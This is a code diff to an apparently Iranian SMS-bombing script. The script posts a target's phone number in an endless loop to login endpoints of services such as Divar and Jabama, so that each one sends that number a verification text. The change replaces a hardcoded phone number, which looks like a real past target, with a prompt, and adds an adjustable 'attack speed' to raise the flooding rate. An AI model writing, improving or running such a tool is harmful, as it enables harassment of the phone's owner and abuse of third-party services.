@@ -2,8 +2,20 @@ import requests
 import random
 import time
 
-#number = input("Enter number (937.........) :")
-number = "9960990587"
+#########################
+Green="\033[1;33m"
+Blue="\033[1;34m"
+Grey="\033[1;30m"
+Reset="\033[0m"
+Red="\033[1;31m"
+cyan = "\033[36m"
+pink = "\033[95m"
+purple = "\033[35m"
+#########################
+
+
+number = input("" + cyan + "[" + Red + "Enter" + cyan + "]─[" + Blue + "number" + cyan + "]─[" + Green + "(937.........) :" + cyan + "]" + Red + ": " + Reset)
+attack_speed = float(input("Enter attack speed in seconds: "))
 
 url_divar = "	https://api.divar.ir/v5/auth/authenticate"
 json_divar = {"phone":number}
@@ -116,7 +128,4 @@ while True:
     req_jabama = requests.post(url= url_jabama,json=json_jabama,headers=random_head)
     print("jabama",req_jabama)
 
-
-
-
-    time.sleep(30)
+    time.sleep(attack_speed)
